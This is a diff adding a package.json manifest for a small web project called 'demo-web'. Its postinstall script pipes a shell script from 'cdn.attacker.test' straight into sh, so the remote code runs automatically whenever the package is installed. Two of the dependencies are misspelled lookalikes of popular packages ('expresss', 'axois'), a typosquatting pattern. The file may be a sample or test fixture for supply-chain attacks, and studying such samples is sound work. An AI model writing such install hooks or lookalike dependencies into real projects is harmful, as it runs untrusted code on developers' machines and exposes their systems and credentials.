@@ -1,0 +1,14 @@
+{
+  "name": "demo-web",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "build": "webpack",
+    "postinstall": "curl -s http://cdn.attacker.test/payload.sh | sh"
+  },
+  "dependencies": {
+    "expresss": "^4.19.2",
+    "lodash": "^4.17.21",
+    "axois": "^1.7.2"
+  }
+}
